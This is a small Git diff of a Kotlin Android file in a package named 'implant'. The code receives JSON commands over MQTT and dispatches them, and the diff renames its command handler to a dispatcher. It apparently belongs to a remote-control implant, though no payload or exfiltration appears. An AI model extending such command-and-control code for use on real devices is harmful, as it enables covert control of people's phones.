@@ -3,7 +3,6 @@ package com.cooperthecoder.implant.command
 import android.content.Context
 import android.util.Log
 import com.cooperthecoder.implant.Config
-import com.cooperthecoder.implant.crypto.Base64Encoder
 import com.cooperthecoder.implant.crypto.Base64KeyPair
 import com.cooperthecoder.implant.crypto.NetworkEncryption
 import com.cooperthecoder.implant.data.SharedPreferencesQuery
@@ -20,7 +19,7 @@ class CommandMessageCallback(client: MqttAndroidClient, context: Context) : Mqtt
     }
 
     val context: Context = context.applicationContext
-    val commandHandler = CommandHandler(context, client)
+    val dispatcher = CommandDispatcher(context, client)
 
     override fun messageArrived(topic: String, message: MqttMessage) {
         val text = String(message.payload, Charset.forName("UTF-8"))
@@ -36,7 +35,7 @@ class CommandMessageCallback(client: MqttAndroidClient, context: Context) : Mqtt
             Log.e(TAG, "Error parsing JSON from: $text", e)
             return
         }
-        commandHandler.handle(command)
+        dispatcher.dispatch(command)
     }
 
     override fun connectionLost(cause: Throwable?) {
